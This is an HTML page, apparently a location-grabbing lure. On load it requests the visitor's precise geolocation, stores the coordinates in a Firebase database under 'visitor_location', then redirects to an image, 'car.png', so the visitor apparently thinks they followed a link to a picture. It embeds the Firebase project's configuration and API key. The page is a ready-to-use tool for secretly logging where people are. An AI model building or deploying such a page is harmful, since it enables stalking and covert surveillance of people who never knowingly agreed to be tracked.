<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker</title>
    <!-- Include Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-database.js"></script>
</head>
<body>
    <h1>Location Tracker</h1>
    <div id="loadingMessage">Fetching your location...</div>

    <!-- Firebase Configuration and Initialization -->
    <script>
        const firebaseConfig = {
    apiKey: "AIzaSyDhybbF-iUi5jjEzYa7tallWkvlJmoqkmg",
    authDomain: "location-ab4c9.firebaseapp.com",
    databaseURL: "https://location-ab4c9-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "location-ab4c9",
    storageBucket: "location-ab4c9.appspot.com",
    messagingSenderId: "250509744763",
    appId: "1:250509744763:web:cf3e74eb91dd23b11020de",
    measurementId: "G-M9HKC9N8KC"
  };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
    </script>

    <!-- Your JavaScript code for location tracking -->
    <script>
        // Function to save the visitor's location in Firebase Realtime Database
        async function savePosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            console.log("Latitude: " + latitude + " Longitude: " + longitude);

            // Save the location data in Firebase Realtime Database
            const database = firebase.database();
            const ref = database.ref('visitor_location');
            ref.push({ latitude: latitude, longitude: longitude });

            // Show an alert
            alert("Location data saved successfully!");
            // Redirect to "car.png" or perform other actions
            window.location.replace("car.png");
        }

        // Function to handle errors in geolocation
        function errorHandler(error) {
            console.log("Error getting location:", error.message);
            document.getElementById('loadingMessage').textContent = "Error getting your location.";
        }

        // Function to get the visitor's location
        async function getLocation() {
            console.log('Getting location...');
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(savePosition, errorHandler, { enableHighAccuracy: true });
            } else {
                console.log("Geolocation is not supported by this browser.");
                document.getElementById('loadingMessage').textContent = "Geolocation is not supported by this browser.";
            }
        }

        // Call the getLocation function when the page loads
        window.onload = function() {
            getLocation();
        };
    </script>
</body>
</html>
